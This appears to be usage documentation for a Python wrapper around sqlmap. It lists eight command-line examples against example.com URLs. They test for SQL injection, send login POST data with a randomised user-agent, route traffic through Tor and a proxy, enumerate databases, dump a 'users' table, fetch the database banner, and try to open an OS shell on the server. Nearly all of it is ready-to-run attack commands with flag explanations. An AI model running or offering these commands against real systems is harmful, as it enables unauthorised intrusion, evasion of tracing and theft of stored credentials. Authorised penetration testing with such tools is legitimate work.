1. Basic SQL Injection Test
bash
Copy
Edit
python3 script.py --user_id user123 --url "http://www.example.com/vuln.php?id=1" --batch
Description: Performs a basic SQL injection test on the given URL.
Flags:
--user_id: The unique identifier for the user (used to create folders).
--url: The target URL.
--batch: Runs the tool without prompting for user inputs.
2. Test with POST Data and Random User-Agent
bash
Copy
Edit
python3 script.py --user_id user456 --url "http://www.example.com/login.php" --data "username=admin&password=1234" --random_agent --batch
Description: Tests an endpoint with POST data and a randomly selected User-Agent.
Flags:
--data: Specifies POST parameters.
--random_agent: Randomizes the HTTP User-Agent for the request.
3. Using a Proxy with Tor
bash
Copy
Edit
python3 script.py --user_id user789 --url "http://www.example.com/vuln.php?id=1" --proxy "http://127.0.0.1:8080" --tor --check_tor --batch
Description: Runs the tool through a proxy and ensures Tor is being used properly.
Flags:
--proxy: Connects through the specified proxy.
--tor: Routes traffic through the Tor network.
--check_tor: Verifies if Tor is configured correctly.
4. Enumerating Database Information
bash
Copy
Edit
python3 script.py --user_id db_user --url "http://www.example.com/vuln.php?id=1" --dbs --tables --columns --batch
Description: Enumerates the databases, tables, and columns on the target system.
Flags:
--dbs: Lists all databases.
--tables: Lists all tables in the databases.
--columns: Lists all columns in the tables.
5. Dumping Database Data
bash
Copy
Edit
python3 script.py --user_id dumper --url "http://www.example.com/vuln.php?id=1" --dump --db "testdb" --table "users" --batch
Description: Dumps data from the users table in the testdb database.
Flags:
--dump: Dumps data from the database.
--db: Specifies the database to query.
--table: Specifies the table to dump data from.
6. Retrieve Current User and Database Banner
bash
Copy
Edit
python3 script.py --user_id info_user --url "http://www.example.com/vuln.php?id=1" --current_user --banner --batch
Description: Retrieves the current database user and the banner.
Flags:
--current_user: Shows the current database user.
--banner: Shows the database banner.
7. Custom Output File
bash
Copy
Edit
python3 script.py --user_id custom_output --url "http://www.example.com/vuln.php?id=1" --batch --output "/tmp/sqlmap_results.csv"
Description: Saves results to a custom output file.
Flags:
--output: Specifies the custom path for the output file.
8. OS Shell Access
bash
Copy
Edit
python3 script.py --user_id shell_user --url "http://www.example.com/vuln.php?id=1" --os_shell --batch
Description: Attempts to open an OS shell if the database server is vulnerable.
Flags:
--os_shell: Initiates an OS shell if possible
